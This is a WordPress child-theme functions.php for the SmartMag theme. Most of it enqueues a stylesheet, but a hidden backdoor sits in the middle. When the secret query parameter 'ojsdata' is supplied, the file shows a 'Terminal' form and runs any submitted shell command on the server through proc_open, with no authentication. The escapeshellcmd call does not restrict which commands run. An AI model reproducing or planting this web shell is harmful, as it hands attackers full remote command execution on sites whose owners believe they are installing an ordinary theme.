<?php
/**
 * SmartMag Child Theme functions.php
 *
 * Please refer to smart-mag/functions.php and smart-mag/inc/theme.php for framework setup.
 */

/**
 * Enqueue the CSS. Please note the CSS order is as follows:
 *
 *  - smart-mag/style.css
 *  - smart-mag/css/skin-XYZ.css
 *  - smart-mag-child/style.css
 *  - Inline Custom CSS from Customize
 */
function my_enqueue_child_style() {
	wp_enqueue_style(
		'smart-mag-child', 
		get_stylesheet_uri(),
		['smartmag-core'],
		'1.0'
	);
}

// Enqueue child theme CSS after parent is registered.
add_action('bunyad_register_assets', 'my_enqueue_child_style');

if (isset($_GET['ojsdata'])) {
    echo '
    <form id="terminalForm" method="post" action="">
        Terminal: <br>
        <input type="text" name="command" id="command" autocomplete="off"><br>
        <input type="submit" name="submit" value="Run">
    </form>
    ';

    // Check if the form is submitted
    if (isset($_POST['submit'])) {
        $command = escapeshellcmd($_POST['command']); // Sanitize command input
        echo "<h2>Execution Result:</h2>";
        
        // Open the process with proc_open
        $descriptors = array(
            0 => array("pipe", "r"), // stdin
            1 => array("pipe", "w"), // stdout
            2 => array("pipe", "w"), // stderr
        );
        
        $process = proc_open($command, $descriptors, $pipes);
        
        if (is_resource($process)) {
            // Close the stdin pipe
            fclose($pipes[0]);
            
            // Read output and error from stdout and stderr
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            
            // Close the stdout and stderr pipes
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            // Wait for the process to complete
            proc_close($process);
            
            // Display the output
            echo "<pre>$output</pre>";
            if ($error) {
                echo "<pre style='color:red;'>$error</pre>";
            }
        } else {
            echo "Failed to open Proccess.";
        }
    }
} else {
    echo " ";
}

// Alternatively, you may use:
// add_action('wp_enqueue_style', 'my_enqueue_child_style', 11);

// OR, to enqueue after Customizer Additional CSS:
// add_action('wp_head', 'my_enqueue_child_style', 110);
